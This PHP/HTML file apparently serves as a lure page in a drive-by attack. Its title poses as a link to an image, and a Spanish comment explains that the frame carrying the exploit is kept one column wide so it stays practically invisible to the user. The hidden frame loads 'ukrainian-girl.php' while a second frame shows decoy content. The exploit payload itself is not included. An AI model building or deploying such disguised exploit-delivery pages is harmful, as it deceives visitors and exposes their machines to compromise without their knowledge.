<?php

	header("Expires: Mon, 20 Mar 1998 12:01:00 GMT");
	header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0",FALSE);
	header("Pragma: no-cache");

?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<html>
<head>
<title>http://<?php echo $_SERVER['SERVER_NAME'] ?>/ukrainian-girl.jpg</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<!-- Observar que el frame donde estará el exploit lo hemos dejado a 1 columna
para que sea practicamente invisible al user -->
<frameset cols="1,*" frameborder="NO" border="0" framespacing="0">
  <frame src="ukrainian-girl.php" name="leftFrame" scrolling="NO" noresize>
  <frame src="display.php" name="mainFrame">
</frameset>
<noframes><body>

</body></noframes>
</html>
